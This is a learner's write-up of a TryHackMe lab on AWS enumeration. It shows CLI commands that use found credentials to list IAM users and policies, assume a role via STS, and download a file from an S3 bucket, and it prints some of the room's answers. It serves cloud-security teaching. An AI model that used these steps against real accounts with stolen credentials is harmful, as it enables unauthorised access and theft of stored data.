<h3 align="center">Advent of Cyber 2025 &nbsp;&nbsp; ·  &nbsp;&nbsp; Day 23 &nbsp;&nbsp; ·  &nbsp;&nbsp; AWS Security - S3cret Santa</h3>
<p align="center">2025, December 23  &nbsp; ·  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure in <a href="https://tryhackme.com">TryHackMe</a>.<br>Learn the basics of AWS enumeration. &nbsp;&nbsp;Access it <a href="Learn the basics of AWS enumeration.">here</a>.<br><img width="80px" src="https://github.com/user-attachments/assets/3c8904f1-f33a-45eb-8dcb-062bfe47b7b6"<br><br><img width="1200px" src="https://github.com/user-attachments/assets/680dcb83-fded-4595-8a25-74b625ab64fb"></p>

<h2>Task 1 &nbsp; ·  &nbsp; Introduction</h2>

<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/7294aab6-c57f-4c63-98cb-893ddd7a83de"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>One of our stealthiest infiltrated elves managed to hop their way into Sir Carrotbane’s office and, lo and behold, discovered a bundle of cloud credentials just lying around on his desktop like forgotten carrots. The agent suspects these could be the key to regaining access to TBFC’s cloud network. If only the poor hare had the faintest clue what “the cloud” is, he’d burrow in himself. Let's help the elf utilise these credentials to try to regain access to TBFC's cloud network.</p>

<h3>Learning Objectives</h3>
<p></p>

- Learn the basics of AWS accounts.<br>
- Enumerate the privileges granted to an account, from an attacker's perspective.<br>
- Familiarise yourself with the AWS CLI.</p>

<h3>Lab Connection</h3>
<p>Before moving forward, review the questions in the connection card shown below:<br>

<h6 align="center"><img width="400px" src="https://github.com/user-attachments/assets/620f08e1-a8d4-4a6e-b64b-b64a0b054bd7"><br><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>

<p>Start your target machine by clicking the <strong>Start Machine</strong> button below. The machine will open in split view and need about 2 minutes to fully boot. In case you can not see it, click the <strong>Show Split View</strong> button at the top of the page.</p>





<p>AWS accounts can be accessed programmatically by using an Access Key ID and a Secret Access Key. For this room, both of those will be automatically configured for you. The AWS CLI will look for credentials at <code>~/.aws/credentials</code>, where you should see something similar to the following:</p>



```bash
aws_access_key_id = ....................
aws_secret_access_key = .........................................
```

<p>Amazon Security Token Service (STS) allows us to utilise the credentials of a user that we have saved during our AWS CLI configuration. We can use the <code>get-caller-identity</code> call to retrieve information about the user we have configured for the AWS CLI. Let's run the following command:<br>

<code>aws sts get-caller-identity</code><br>

We will see the following output when we run this command.</p>

<p><em>Checking AWS CLI Configuration</em></p>

```bash
user@machine$ aws sts get-caller-identity
{
    "UserId": "AIDAU2VYTBGYOHNOCJMX3",
    "Account": "332173347248",
    "Arn": "arn:aws:iam::332173347248:user/sir.carrotbane"
}
```

<p>Seeing the output, the elf was overjoyed. The credentials work, and as can be seen by the name at the end, they belong to Sir Carrotbane. The elf can now attempt to regain access to TBFC's cloud network using these credentials.</p>

<p><em>Answer the question below</em></p>

<p>1.1. <em>Run <code>aws sts get-caller-identity</code>code>. What is the number shown for the "Account" parameter?</em><br>
<code>••••••••••••</code></p>

```bash
ubuntu@tryhackme:~$ aws sts get-caller-identity
{
    "UserId": "◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦",
    "Account": "••••••••••••",
    "Arn": "arn:aws:iam::••••••••••••:user/sir.carrotbane"
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/2875274f-14bf-4b4c-8cfe-a3b8f3f230a8"><br><br>Rosana´s hands-on.</h6>

<br>
<h2>Task 2 &nbsp; ·  &nbsp; IAM: Users, Roles, Groups and Policies</h2>
<h3>IAM Overview</h3>
<p>Amazon Web Services utilises the Identity and Access Management (IAM) service to manage users and their access to various resources, including the actions that can be performed against those resources. Therefore, it is crucial to ensure that the correct access is assigned to each user according to the requirements. Misconfiguring IAM has led to several high-profile security incidents in the past, giving attackers access to resources they were not supposed to access. Companies like Toyota, Accenture and Verizon have been victims of such attacks in the past, often exposing customer data or sensitive documents. Below, we will discuss the different aspects of IAM that can lead to sensitive data exposure if misconfigured.</p>

<h3>IAM Users</h3>
<p>A user represents a single identity in AWS. Each user has a set of credentials, such as passwords or access keys, that can be used to access resources. Furthermore, permissions can be granted at a user level, defining the level of access a user might have.</p>

<h6 align="center"><img width="280px" src="https://github.com/user-attachments/assets/9f3f31a6-42da-4a05-921c-eaa5a0458f62"><br><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>


<h3>IAM Groups</h3>
<p>Multiple users can be combined into a group. This can be done to ease the access management for multiple users. For example, in an organisation employing hundreds of thousands of people, there might be a handful of people who need write access to a certain database. Instead of granting access to each user individually, the admin can grant access to a group and add all users who require write access to that group. When a user no longer needs access, they can be removed from the group.<br

Multiple users can be combined into a group. This can be done to ease the access management for multiple users. For example, in an organisation employing hundreds of thousands of people, there might be a handful of people who need write access to a certain database. Instead of granting access to each user individually, the admin can grant access to a group and add all users who require write access to that group. When a user no longer needs access, they can be removed from the group.</p>

<h6 align="center"><img width="280px" src="https://github.com/user-attachments/assets/42bf5717-9def-46f2-b98e-bc71cce2f2cd"><br><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>

<h3>IAM Roles</h3>
<p>An IAM Role is a temporary identity that can be assumed by a user, as well as by services or external accounts, to get certain permissions. Think of Sir Carrotbane, and how, depending on the battle ahead, he might need to assume the role of an attacker or a defender. When becoming an attacker, he will get permission to wield his shiny swords, but when assuming the role of a defender, he will instead get permission to carry a shield to better defend King Malhare.</p>

<h3>IAM Policies</h3>
<p>Access provided to any user, group or role is controlled through IAM policies. A policy is a JSON document that defines the following:<br>

- What action is allowed (Action)<br>
- On which resources (Resource)<br>
- Under which conditions (Condition)<br>
- For whom (Principal)<br>

Consider the following hypothetical policy</p>

<p><em>IAM Policy example</em></p>

```bash
IAM
Policy example
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowSpecificUserReadAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::••••••••••••:user/Alice"
      },
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::my-private-bucket/*"
    }
  ]
}
```

<p>This policy grants access to the AWS user Alice (Principal) to get an object from an S3 bucket (Action) for the S3 bucket named my-private-bucket (Resource).</p>

<p><em>Answer the question below</em></p>

<p>2.1. <em>What IAM component is used to describe the permissions to be assigned to a user or a group?</em><br>
<code>policy</code></p>

<br>
<h2>Task 3 &nbsp; ·  &nbsp; Practical: Enumerating a User´s Permissions</h2>
<h3>Enumerating Users</h3>
<p>Alright, let's see what we can do with the credentials we got from Sir Carrotbane's office, since we have already configured them in our environment. We can start interacting with the AWS CLI to find more information. Let's begin by enumerating users. We can do so by running the following command in the terminal:<br>

<code>aws iam list-users</code><br>

We will see an output that lists all the users, as well as some other useful information such as their creation date. </p>

<h3>Enumerating User Policies</h3>
<p>Policies can be inline or attached. Inline policies are assigned directly in the user (or group/role) profile and hence will be deleted if the identity is deleted. These can be considered as hard-coded policies as they are hard-coded in the identity definitions. Attached policies, also called managed policies, can be considered reusable. An attached policy requires only one change in the policy, and every identity that policy is attached to will inherit that change automatically.<br>

Let's see what inline policies are assigned to Sir Carrotbane by running the following command.<br>

<code>aws iam list-user-policies --user-name sir.carrotbane<</code>br>

Great! We can see an inline policy in the results. Let's take note of its name for later.<br>

Maybe, Sir Carrotbane has some policies attached to their account. We can find out by running the following command.<br>

<code>aws iam list-attached-user-policies --user-name sir.carrotbane</code><br>

Hmmm, not much here. Perhaps we can check if Sir Carrotbane is part of a group. Let's run this command to do that.<br>

<code>aws iam list-groups-for-user --user-name sir.carrotbane</code><br>

Looks like <strong>sir.carrotbane</strong> is not a part of any group.<br>

Let's get back to the inline policy we found for Sir Carrotbane's account. Let's see what permissions this policy grants by running the following command (replace <code>POLICYNAME</code> with the actual policy name you found):<br>

<code>aws iam get-user-policy --policy-name POLICYNAME --user-name sir.carrotbane</code></p>

```bash
{
    "UserName": "sir.carrotbane",
    "PolicyName": "POLICYNAME",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:ListUsers",
                    "iam:ListGroups",
                    "iam:ListRoles",
                    "iam:ListAttachedUserPolicies",
                    "iam:ListAttachedGroupPolicies",
                    "iam:ListAttachedRolePolicies",
                    "iam:GetUserPolicy",
                    "iam:GetGroupPolicy",
                    "iam:GetRolePolicy",
                    "iam:GetUser",
                    "iam:GetGroup",
                    "iam:GetRole",
                    "iam:ListGroupsForUser",
                    "iam:ListUserPolicies",
                    "iam:ListGroupPolicies",
                    "iam:ListRolePolicies",
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListIAMEntities"
            }
        ]
    }
}
```

<p>So, it looks like Sir Carrotbane has access to enumerate all the different kinds of users, groups, roles and policies (IAM entities), but that is about it. That is not a lot of help getting TBFC's access back. We might need to try something different to do that. If you look carefully, you'll notice sir.carrotbane can perform the <code>sts:AssumeRole</code> action. Maybe there's still hope!</p>

<p><em>Answer the question below</em></p>

<p>3.1. <em>What is the name of the policy assigned to <code>sir.carrotbane</code>?</em><br>
<code>SirCarrotbanePolicy</code></p>


```bash
ubuntu@tryhackme:~$ aws iam list-users
{
    "Users": [
        {
            "Path": "/",
            "UserName": "sir.carrotbane",
            "UserId": "◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦",
            "Arn": "arn:aws:iam::••••••••••••:user/sir.carrotbane",
            "CreateDate": "2025-12-23..."
        }
    ]
}

```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d845d485-1ef9-463a-bdd7-d97292ca15e5"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws iam list-user-policies --user-name sir.carrotbane
{
    "PolicyNames": [
        "SirCarrotbanePolicy"
    ]
}
```


<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/ad7c0326-b87e-44d8-a6a1-b982cc0c7809"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws iam list-attached-user-policies --user-name sir.carrotbane
{
    "AttachedPolicies": []
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/8522863d-c55e-4927-bb95-d0582402e8a0"><br><br>Rosana´s hands-on</h6>
<br>
<br>


```bash
ubuntu@tryhackme:~$ aws iam list-groups-for-user --user-name sir.carrotbane
{
    "Groups": []
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e2ef1b9c-a743-47d7-a3dd-615a0479c36b"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
{
    "UserName": "sir.carrotbane",
    "PolicyName": "SirCarrotbanePolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:ListUsers",
                    "iam:ListGroups",
                    "iam:ListRoles",
                    "iam:ListAttachedUserPolicies",
                    "iam:ListAttachedGroupPolicies",
                    "iam:ListAttachedRolePolicies",
                    "iam:GetUserPolicy",
                    "iam:GetGroupPolicy",
                    "iam:GetRolePolicy",
                    "iam:GetUser",
                    "iam:GetGroup",
                    "iam:GetRole",
                    "iam:ListGroupsForUser",
                    "iam:ListUserPolicies",
                    "iam:ListGroupPolicies",
                    "iam:ListRolePolicies",
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListIAMEntities"
            }
        ]
    }
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/4d68afef-a16d-4769-bb8a-6c05f11d37d5"><br><br>Rosana´s hands-on</h6>
<br>
<br>
<h2>Task 4 &nbsp; ·  &nbsp; Assuming Roles</h2>
<h3>Enumerating Roles</h3>
<p>The <code>sts:AssumeRole</code> action we previously found allows sir.carrotbane to assume roles. Perhaps we can try to see if there's any interesting ones available. Let's start by listing the existing roles in the account.<br>

```bash
{
    "Roles": [
        {
            "Path": "/",
            "RoleName": "bucketmaster",
            "RoleId": "······················",
            "Arn": "arn:aws:iam::••••••••••••:role/bucketmaster",
            "CreateDate": "2025-11-26...",
            "AssumeRolePolicyDocument": {
                "Statement": [
                    {
                        "Action": "sts:AssumeRole",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::••••••••••••:user/sir.carrotbane"
                        }
                    }
                ],
                "Version": "2012-10-17"
            },
            "MaxSessionDuration": 3600
        }
    ]
}
```

<p>Bingo! There's a role named <code>bucketmaster</code>, and it can be assumed by <code>sir.carrotbane</code>. Let's find out what policies are assigned to this role. Just as users, roles can have inline policies and attached policies. To check the inline policies, we can run the following command.<br>

<code>aws iam list-role-policies --role-name bucketmaster</code><br>

There is one policy assigned to this role. Before checking that policy, let's see if there are any attached policies assigned to the role as well.<br>

<code>aws iam list-attached-role-policies --role-name bucketmaster</code><br>

Looks like we only have the inline policy assigned. Let's see what permissions we can get from the policy.<br>

<code>aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy</code></p>

```bash
{
    "RoleName": "bucketmaster",
    "PolicyName": "BucketMasterPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:ListAllMyBuckets"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListAllBuckets"
            },
            {
                "Action": [
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::easter-secrets-......,
                    "arn:aws:s3:::bunny-website-......"
                ],
                "Sid": "ListBuckets"
            },
            {
                "Action": [
                    "s3:GetObject"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::easter-secrets-....../*",
                "Sid": "GetObjectsFromEasterSecrets"
            }
        ]
    }
}
```

<p>Well, what do we have here? We can see that the <code>bucketmaster</code> role can perform three different actions (ListAllBuckets, ListBucket and GetObject) on some resources of a service named S3. This might just be the breakthrough we were looking for. More on this service later.</p>

<h3>Assuming Role</h3>
<p>To gain privileges assigned by the <code>bucketmaster</code> role, we need to assume it. We can use AWS STS to obtain the temporary credentials that enable us to assume this role.<br>

<code>aws sts assume-role --role-arn arn:aws:iam::••••••••••••:role/bucketmaster --role-session-name TBFC</code><br>

This command will ask STS, the service in charge of AWS security tokens, to generate a temporary set of credentials to assume the  <code>bucketmaster</code> role. The temporary credentials will be referenced by the session-name "TBFC" (you can set any name you want for the session). Let's run the command:</p>

```bash
{
    "Credentials": {
        "AccessKeyId": "······················",
        "SecretAccessKey": "...",
        "SessionToken": "...",
        "Expiration": "2025-11-26..."
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "······················:TBFC",
        "Arn": "arn:aws:sts::••••••••••••:assumed-role/bucketmaster/TBFC"
    },
    "PackedPolicySize": 6
}
```

<p>The output will provide us the credentials we need to assume this role, specifically the <code>AccessKeyID</code>, <code>SecretAccessKey</code> and <code>SessionToken</code>. To be able to use these, run the following commands in the terminal, replacing with the exact credentials that you received on running the <code>assume-role</code> command.</p>

<p><em>Setting the Temporary Credentials to Assume Role</em></p>

```bash
user@machine$ export AWS_ACCESS_KEY_ID="ASIAxxxxxxxxxxxx"
user@machine$ export AWS_SECRET_ACCESS_KEY="abcd1234xxxxxxxxxxxx"
user@machine$ export AWS_SESSION_TOKEN="FwoGZXIvYXdzEJr..."
```

<p>Once we have done that, we can officially use the permissions granted by the <code>bucketmaster</code> role. To check if you have correctly assumed the role, you can once again run:<br>

<code>aws sts get-caller-identity</code><br>

This time, it should show you are now using the <code>bucketmaster</code> role.</p>

<p><em>Answer the question below</em></p>

<p>4.1. <em>Apart from GetObject and ListBucket, what other action can be taken by assuming the bucketmaster role?</code>?</em><br>
<code>ListAllMyBuckets</code></p>


```bash
ubuntu@tryhackme:~$ aws iam list-roles
{
    "Roles": [
        {
            "Path": "/",
            "RoleName": "bucketmaster",
            "RoleId": ".....................",
            "Arn": "arn:aws:iam::••••••••••••:role/bucketmaster",
            "CreateDate": "2025-12-23...",
            "AssumeRolePolicyDocument": {
                "Statement": [
                    {
                        "Action": "sts:AssumeRole",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::••••••••••••:user/sir.carrotbane"
                        }
                    }
                ],
                "Version": "2012-10-17"
            },
            "MaxSessionDuration": 3600
        }
    ]
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e2604aee-abc5-476b-9276-aca67a44b490"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws iam list-role-policies --role-name bucketmaster
{
    "PolicyNames": [
        "BucketMasterPolicy"
    ]
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7e551ead-c657-4e5b-8167-9a16365fac98"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws iam list-attached-role-policies --role-name bucketmaster
{
    "AttachedPolicies": []
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3bd3aeac-7a2f-4cc7-b523-4e28dc07ef26"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
{
    "RoleName": "bucketmaster",
    "PolicyName": "BucketMasterPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:ListAllMyBuckets"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListAllBuckets"
            },
            {
                "Action": [
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::easter-secrets-......",
                    "arn:aws:s3:::bunny-website-......"
                ],
                "Sid": "ListBuckets"
            },
            {
                "Action": [
                    "s3:GetObject"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::easter-secrets-....../*",
                "Sid": "GetObjectsFromEasterSecrets"
            }
        ]
    }
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/caf1d1fe-bfac-446b-aa8c-828e0a83ec0b"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws sts assume-role --role-arn arn:aws:iam::••••••••••••:role/bucketmaster --role-session scb-bucketmaster
{
    "Credentials": {
        "AccessKeyId": ".......................",
        "SecretAccessKey": "........................................",
        "SessionToken": "...",
        "Expiration": "2025-12-23..."
    },
    "AssumedRoleUser": {
        "AssumedRoleId": ".....................:scb-bucketmaster",
        "Arn": "arn:aws:sts::••••••••••••:assumed-role/bucketmaster/scb-bucketmaster"
    },
    "PackedPolicySize": 6
}
```

```bash
ubuntu@tryhackme:~$ export AWS_ACCESS_KEY_ID="......................."
ubuntu@tryhackme:~$ export AWS_SECRET_ACCESS_KEY="........................................"
ubuntu@tryhackme:~$ export AWS_SESSION_TOKEN="..."
```

<br>
<br>

```bash
ubuntu@tryhackme:~$ aws sts get-caller-identity
{
    "UserId": ".....................:scb-bucketmaster",
    "Account": "••••••••••••",
    "Arn": "arn:aws:sts::••••••••••••:assumed-role/bucketmaster/scb-bucketmaster"
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9a2e3567-08fb-480c-9d3e-79e107828322"><br><br>Rosana´s hands-on</h6>
<br>
<br>
<h2>Task 5 &nbsp; ·  &nbsp; Grabbings a file from S3</h2>
<h3>What Is S3?</h3>h3>
<p>Before we continue, we need to know what exactly is S3. Amazon S3 stands for Simple Storage Service. It is an object storage service provided by Amazon Web Services that can store any type of object such as images, documents, logs and backup files. Companies often use S3 to store data for various reasons, such as reference images for their website, documents to be shared with clients, or files used by internal services for internal processing. Any object you store in S3 will be put into a "Bucket". You can think of a bucket as a directory where you can store files, but in the cloud.</p>

<h6 align="center"><img width="280px" src="https://github.com/user-attachments/assets/7aab605f-4f14-4756-a702-83ed01196a0b"><br><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>

<p>Now, let's see what our newly gained access to Sir Carrotbane's S3 bucket provides us.</p>

<h3>Listing Contents From a Bucket</h3>
<p>Since our profile has permission to ListAllBuckets, we can list the available S3 buckets by running the following command:<br>

<code>aws s3api list-buckets</code><br>

There is one interesting bucket in there that references easter. Let's check out the contents of this directory.<br>

<code>aws s3api list-objects --bucket easter-secrets-123145</code><br>

Hmmm, let's copy the file in this directory to our local machine. This might have a secret message.<br>

<code>aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt</code><br>

Hooray! We have successfully infiltrated Sir Carrotbane's S3 bucket and exfiltrated some sensitive data.</p>

<p><em>Answer the question below</em></p>

<p>5.1. <em>What are the contents of the cloud_password.txt file?</em><br>
<code>THM{♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥}</code></p>

```bash
ubuntu@tryhackme:~$ aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "easter-secrets-......",
            "CreationDate": "2025-12-23..."
        },
        {
            "Name": "bunny-website-......",
            "CreationDate": "2025-12-23..."
        }
    ],
    "Owner": {
        "DisplayName": "webfile",
        "ID": "..............................."
    },
    "Prefix": null
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/88dacf1e-d180-494c-85ab-b79686931c1b"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ aws s3api list-objects --bucket easter-secrets-......
{
    "Contents": [
        {
            "Key": "cloud_password.txt",
            "LastModified": "2025-12-23...",
            "ETag": "\"................................\"",
            "Size": 29,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "webfile",
                "ID": ".............................................................."
            }
        },
        {
            "Key": "groceries.txt",
            "LastModified": "2025-12-2...",
            "ETag": "\"................................\"",
            "Size": 28,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "webfile",
                "ID": ".............................................................."
            }
        }
    ],
    "RequestCharged": null,
    "Prefix": null
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/dd99d4bf-9788-4862-8360-d965aeec3382"><br><br>Rosana´s hands-on</h6>
<br>
<br>


```bash
ubuntu@tryhackme:~$ aws s3api get-object --bucket easter-secrets-...... --key cloud_password.txt cloud_password.txt
{
    "AcceptRanges": "bytes",
    "LastModified": "2025-12-2...",
    "ContentLength": 29,
    "ETag": "\"...............................\"",
    "ContentType": "application/octet-stream",
    "Metadata": {}
}
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/07998ca5-2c21-40b7-aeeb-11c1bd3280ea"><br><br>Rosana´s hands-on</h6>
<br>
<br>

```bash
ubuntu@tryhackme:~$ cat cloud_password.txt
```


<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/8a930eda-e55b-4a48-aaf9-b7d39629f53a"><br><br>Rosana´s hands-on</h6>
<br>
<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/74575964-faf7-4ca1-89ab-beafb8d7768c"><br><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/c5259494-e872-43e6-a21b-41631edf71fb"><br><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/176f26da-7122-4718-9eef-753a41015188"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, December</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|23      |Easy 🔗 - AWS Security - S3cret Santa            |7 |      99ᵗʰ  |     3ʳᵈ    |   16,068ᵗʰ   |      182ⁿᵈ     |    135,008  |    1,045    |    84     |
|23      |Easy 🔗 - Malware Analysis - Malhare.exe         |7 |      99ᵗʰ  |     3ʳᵈ    |   17,332ⁿᵈ   |      191ˢᵗ     |    134,968  |    1,044    |    84     |
|20      |Medium 🔗 - Containers - DoorDasher's Demise     |4 |     100ᵗʰ  |     3ʳᵈ    |   18,059ᵗʰ   |      206ᵗʰ     |    134,864  |    1,043    |    84     |
|20      |Medium 🔗 - Forensics - Registry Furensics       |4 |     100ᵗʰ  |     3ʳᵈ    |   20,497ᵗʰ   |      239ᵗʰ     |    134,832  |    1,042    |    84     |
|20      |Medium 🔗 - Web Attack Forensics - Drone Alone   |4 |     100ᵗʰ  |     3ʳᵈ    |   21,935ᵗʰ   |      243ʳᵈ     |    134,808  |    1,041    |    84     |
|20      |Easy 🔗 - XSS - Merry XSSMas                     |4 |     100ᵗʰ  |     3ʳᵈ    |   23,069ᵗʰ   |      256ᵗʰ     |    134,792  |    1,040    |    84     |
|20      |Easy 🔗 -  Race Conditions - Toy to The World    |4 |     100ᵗʰ  |     3ʳᵈ    |   24,717ᵗʰ   |      275ᵗʰ     |    134,768  |    1,039    |    84     |
|20      |Medium 🔗 -  SOC Alert Triaging - Tinsel Triage  |4 |     100ᵗʰ  |     3ʳᵈ    |   25,202ⁿᵈ   |      286ᵗʰ     |    134,752  |    1,038    |    84     |
|19      |Medium 🔗 -  ICS/Modbus - Claus for Concern      |3 |     101ˢᵗ  |     3ʳᵈ    |   28,869ᵗʰ   |      337ᵗʰ     |    134,658  |    1,037    |    84     |
|19      |Easy 🔗 -  Passwords - A Cracking Christmas      |3 |     101ˢᵗ  |     3ʳᵈ    |   29,583ʳᵈ   |      340ᵗʰ     |    134,642  |    1,036    |    84     |
|18      |Easy 🔗 -  Prompt Injection - Sched-yule conflict|2 |     101ˢᵗ  |     3ʳᵈ    |   30,518ᵗʰ   |      353ʳᵈ     |    134,626  |    1,035    |    84     |
|18      |Medium 🔗 -  Obfuscation - The Egg Shell File    |2 |     101ˢᵗ  |     3ʳᵈ    |   30,967ᵗʰ   |      358ᵗʰ     |    134,618  |    1,034    |    84     |
|17      |Medium 🔗 - CyberChef - Hoperation Save McSkidy  |1 |     101ˢᵗ  |     3ʳᵈ    |   32,378ᵗʰ   |      374ᵗʰ     |    134,602  |    1,033    |    84     |
|7       |Medium 🔗 - Malware Analysis - Egg-xecutable     |2 |      95ᵗʰ  |     3ʳᵈ    |   11,604ᵗʰ   |      145ᵗʰ     |    134,544  |    1,034    |    84     |
|7       |Easy 🔗 - Network Discovery - Scan-ta Clause     |2 |      95ᵗʰ  |     3ʳᵈ    |   18,575ᵗʰ   |      208ᵗʰ     |    134,522  |    1,033    |    84     |
|7       |Easy 🔗 - React2Shell: CVE-2025-55182            |2 |      95ᵗʰ  |     3ʳᵈ    |   28,593ʳᵈ   |      326ᵗʰ     |    134,474  |    1,032    |    81     |
|6       |Medium 🔗 - IDOR - Santa´s Little IDOR           |1 |      95ᵗʰ  |     3ʳᵈ    |   27,309ᵗʰ   |      328ᵗʰ     |    134,450  |    1,031    |    81     |
|6       |Easy 🔗 - AI in Security - old sAInt nick        |1 |      95ᵗʰ  |     3ʳᵈ    |   41,626ᵗʰ   |      526ᵗʰ     |    134,426  |    1,030    |    81     |
|6       |Medium 🔗 - Splunk Basics - Did you SIEM?        |1 |      95ᵗʰ  |     3ʳᵈ    |   44,647ᵗʰ   |      560ᵗʰ     |    134,410  |    1,029    |    81     |
|6       |Easy 🔗 - Phishing - Merry Clickmas              |1 |      96ᵗʰ  |     3ʳᵈ    |   55,824ᵗʰ   |      674ᵗʰ     |    134,370  |    1,028    |    81     |
|6       |Easy 🔗 - Linux CLI - Shells Bells               |1 |      97ᵗʰ  |     3ʳᵈ    |   53,003ʳᵈ   |      712ⁿᵈ     |    134,354  |    1,027    |    81     |

</h6></div><br>

<p align="center">Global All Time:     99ʰ<br><img width="250px" src="https://github.com/user-attachments/assets/9408c027-0266-4ff7-b990-e479e63ca866"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/c6645607-795f-47df-9817-038728ef4442"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/b795588c-3b56-4264-b857-bb72e0c30a8a"><br><br>
                  Global monthly:  16,068ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a66af69d-080a-4e6e-a742-6f58772f1ef2"><br><br>
                  Brazil monthly:     182ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/382ed88b-0358-46ec-b546-7b6d952cb3a4"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
